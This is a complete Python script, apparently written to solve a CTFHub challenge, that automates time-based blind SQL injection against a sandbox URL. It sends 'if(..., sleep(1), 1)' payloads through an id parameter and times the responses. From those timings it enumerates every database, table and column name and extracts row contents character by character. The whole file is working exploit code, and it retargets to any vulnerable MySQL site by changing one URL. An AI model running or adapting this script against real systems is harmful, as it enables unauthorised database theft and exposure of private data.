import time
import requests
import prettytable as pt  # prettytable是以表格输出的模块

base_url = "http://challenge-bccf2d33355f4f34.sandbox.ctfhub.com:10800/?id=1"  # 以知道数据库注入方式的url
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/110.0.0.0 Mobile Safari/537.36 '
}  # header头


def get_count_database():
    """
    得到网站数据库的数量
    :return: 返回数据库的数量
    """
    global base_url, headers
    for i in range(20):
        start_time = time.time()
        poc = f" and if((select count(schema_name) from information_schema.SCHEMATA)={i}, sleep(1), 1) --+"
        url = base_url + poc
        requests.get(url, headers=headers)
        end_time = time.time()
        if end_time - start_time > 1:
            return i
    print('get_count_database()函数出错')


def get_database_length(count):
    """
    获取所有数据库长度
    :param count: 数据库的数量
    :return: 每个数据库的长度
    """
    global base_url, headers
    len_list = []  # 数据库长度列表
    for i in range(0, count):  # i代表第几个数据库
        length = 1  # length代表数据库长度
        while True:
            poc = f" and if((select length(schema_name) from information_schema.SCHEMATA limit {i},1)={length}, " \
                  f"sleep(1), 1) --+ "
            url = base_url + poc
            start_time = time.time()
            requests.get(url, headers=headers)
            end_time = time.time()
            if end_time - start_time < 1:
                length = length + 1
            else:
                break
            if length > 100:
                print("获取数据库长度异常，get_database_length()出错")
        len_list.append(length)
    return len_list


def get_database(len_list):
    """
    获取所有数据库名称
    :param len_list: 每个数据库的长度
    :return: 所有数据库名称
    """
    global base_url, headers
    data_list = []  # 数据库列表
    data_count = 0  # 代表第几个数据库
    for k in len_list:
        database = ""
        for i in range(1, k + 1):  # i代表数据库第几位
            for j in range(32, 129):  # j是字符
                if j == 128:
                    print("数据库获取异常,get_database()出错")
                poc = f" and if(ascii(substr((select schema_name from information_schema.SCHEMATA limit {data_count},1),{i},1))={j}, sleep(1), 1) --+"
                start_time = time.time()
                url = base_url + poc
                requests.get(url, headers=headers)
                end_time = time.time()
                if end_time - start_time > 1:
                    database += chr(j)
                    break
        data_list.append(database)
        data_count += 1
    return data_list


def get_local_database():
    """
    获取网站当前数据库的名称
    :return:
    """
    global base_url, headers
    length = 1  # length代表数据库长度
    while True:
        poc = f" and if((select length(database()))={length}, sleep(1), 1) --+"
        url = base_url + poc
        start_time = time.time()
        requests.get(url, headers=headers)
        end_time = time.time()
        if end_time - start_time < 1:
            length = length + 1
        else:
            break
        if length > 100:
            print("获取数据库长度异常，get_local_database()出错")
    database = ""
    for i in range(1, length + 1):
        for j in range(32, 127):
            if j == 127:
                print("数据库获取异常，get_local_database()出错")
            poc = f" and if(ascii(substr((select database()),{i},1))={j}, sleep(1), 1) --+"
            url = base_url + poc
            start_time = time.time()
            requests.get(url, headers=headers)
            end_time = time.time()
            if end_time - start_time > 1:
                database += chr(j)
                break
    return database


def get_count_tables(database):
    """
     得到某一个数据库表的数量
    :param database: 指定数据库
    :return: 指定数据库表的数量
    """
    global base_url, headers
    for i in range(150):
        poc = f" and if((select count(table_name) from information_schema.TABLES where TABLE_SCHEMA='{database}')={i}, sleep(1), 1) --+"
        url = base_url + poc
        start_time = time.time()
        requests.get(url, headers=headers)
        end_time = time.time()
        if end_time - start_time > 1:
            return i
    print('指定数据库表的数量错误，get_count_tables()')


def get_tables_length(database, count):
    """
    获取指定数据库所有表的长度
    :param database: 指定的数据库
    :param count: 数据库表的数量
    :return: 指定的数据库所有表的长度
    """
    global base_url, headers
    len_list = []
    for i in range(0, count):
        length = 1
        while True:
            poc = f" and if((select length(table_name) from information_schema.TABLES where TABLE_SCHEMA='{database}' limit {i},1) = {length}, sleep(1), 1) --+"
            url = base_url + poc
            start_time = time.time()
            requests.get(url, headers=headers)
            end_time = time.time()
            if end_time - start_time < 1:
                length = length + 1
            else:
                break
            if length > 100:
                print("指定的数据库表的长度获取错误，get_tables_length()")
        len_list.append(length)
    return len_list


def get_tables(database, len_list):
    """
    获取指定数据库的所有表
    :param database: 指定数据库
    :param len_list: 数据库每个表的长度
    :return: 数据库每个表
    """
    global base_url, headers
    table_list = []
    table_count = 0
    for k in len_list:
        tables = ""
        for i in range(1, k + 1):
            for j in range(32, 129):
                if j == 128:
                    print("指定数据库表获取错误，get_tables()")
                poc = f" and if(ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA='{database}' limit {table_count},1),{i},1))={j}, sleep(1), 1) --+"
                url = base_url + poc
                start_time = time.time()
                requests.get(url, headers=headers)
                end_time = time.time()
                if end_time - start_time > 1:
                    tables += chr(j)
                    break
        table_list.append(tables)
        table_count += 1
    return table_list


def get_count_columns(database, table):
    """
    获取指定数据库指定表的列的数量
    :param database: 指定数据库
    :param tables: 指定表
    :return: 列的数量
    """
    global base_url, headers
    for i in range(150):
        poc = f" and if((select count(column_name) from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}')={i}, sleep(1), 1) --+"
        url = base_url + poc
        start_time = time.time()
        requests.get(url, headers=headers)
        end_time = time.time()
        if end_time - start_time > 1:
            return i
    print('获取指定数据库，指定表的列数错误，get_count_columns()')


def get_columns_length(database, table, count):
    """
    获取指定数据库指定表的每个列的长度
    :param database: 指定数据库
    :param table: 指定表
    :param count: 列的数量
    :return: 指定数据库指定表的每个列的长度
    """
    global base_url, headers
    len_list = []
    for i in range(0, count):
        length = 1
        while True:
            poc = f" and if((select length(column_name) from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}' limit {i},1) = {length}, sleep(1), 1) --+"
            start_time = time.time()
            url = base_url + poc
            requests.get(url, headers=headers)
            end_time = time.time()
            if end_time - start_time < 1:
                length = length + 1
            else:
                break
            if length > 100:
                print("获取指定数据库，指定表的列的长度错误，get_columns_length()")
        len_list.append(length)
    return len_list


def get_columns(database, table, len_list):
    """
    获取指定数据库指定表的列名
    :param database: 指定数据库
    :param table: 指定表
    :param len_list: 指定数据库指定表每列名称的长度列表
    :return:
    """
    global base_url, headers
    column_list = []
    column_count = 0
    for k in len_list:
        tables = ""
        for i in range(1, k + 1):
            for j in range(32, 129):
                if j == 128:
                    print("指定数据库指定表的列名获取错误,get_columns()")
                poc = f" and if(ascii(substr((select column_name from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}' limit {column_count},1),{i},1))={j}, sleep(1), 1) --+"
                url = base_url + poc
                start_time = time.time()
                requests.get(url, headers=headers)
                end_time = time.time()
                if end_time - start_time > 1:
                    tables += chr(j)
                    break
        column_list.append(tables)
        column_count += 1
    return column_list


def get_count_line(database, table, name):
    """
    获取指定数据库，指定表的行数
    :param database: 指定数据库
    :param table: 指定表
    :param name: 列名称
    :return:
    """
    global base_url, headers
    for i in range(20):
        poc = f" and if((select count({name}) from {database}.{table})={i}, sleep(1), 1) --+"
        url = base_url + poc
        start_time = time.time()
        requests.get(url, headers=headers)
        end_time = time.time()
        if end_time - start_time > 1:
            return i
    print('get_count_line()函数出错')


def get_line_length(database, table, name, count):
    """
    获取指定数据库，指定表，指定名称，每行的长度
    :param database:指定数据库
    :param table:指定表
    :param name_list:指定名称
    :param count: 多少行
    :return:每行的长度的列表
    """
    global base_url, headers
    len_list = []  # 数据库长度列表
    for i in range(0, count):  # i代表第几个数据库
        length = 1  # length代表每行的长度长度
        while True:
            poc = f" and if((select length({name}) from {database}.{table} limit {i},1)={length}, sleep(1), 1) --+"
            url = base_url + poc
            start_time = time.time()
            requests.get(url, headers=headers)
            end_time = time.time()
            if end_time - start_time < 1:
                length = length + 1
            else:
                break
            if length > 100:
                print("get_line_length()出错")
        len_list.append(length)
    return len_list


def get_line(database, table, names, len_list):
    """
     获取指定数据库，指定表，指定列名列表
    :param database: 指定数据库
    :param table: 指定表
    :param names: 指定列名
    :param len_list: 指定列每行的长度
    :return: 指定列列表
    """
    global base_url, headers
    line_list = []
    line_count = 0
    for k in len_list:
        line = ""
        for i in range(1, k + 1):  # i代表数据库第几位
            for j in range(32, 129):  # j是字符
                if j == 128:
                    print('get_line()出错')
                poc = f" and if(ascii(substr((select {names} from {database}.{table} limit {line_count},1) ,{i},1))={j}, sleep(1), 1) --+"
                url = base_url + poc
                start_time = time.time()
                requests.get(url, headers=headers)
                end_time = time.time()
                if end_time - start_time > 1:
                    line += chr(j)
                    break
        line_list.append(line)
        line_count += 1
    return line_list



def get_database_total(database):
    """
    获取指定数据库的所有信息
    :param database: 指定数据库
    :return: 以表格的形式返回数据库信息
    """
    table_count = get_count_tables(database)
    table_list_len = get_tables_length(database, table_count)
    table_list = get_tables(database, table_list_len)  # 获取表列表
    column_dict = {}
    for i in table_list:
        """
        获取数据库所有表的列
        """
        column_count = get_count_columns(database, i)
        column_len = get_columns_length(database, i, column_count)
        columns = get_columns(database, i, column_len)
        column_dict[i] = columns
    print(column_dict)
    for name, value in column_dict.items():
        tb = pt.PrettyTable()
        print(f"如下是{name}表的所有数据：")
        for item in value:
            line_count = get_count_line(database, name, item)
            line_len_list = get_line_length(database, name, item, line_count)
            line = get_line(database, name, item, line_len_list)
            tb.add_column(fieldname=item, column=line)
        print(tb)


def get_all_local_database():
    """
    获取指定网址的所有数据库
    :return: 指定网址的所有数据库列表
    """
    data_count_list = get_count_database()
    data_line_list = get_database_length(data_count_list)
    data_list = get_database(data_line_list)
    return data_list


if __name__ == '__main__':
    print(get_database_total('sqli'))
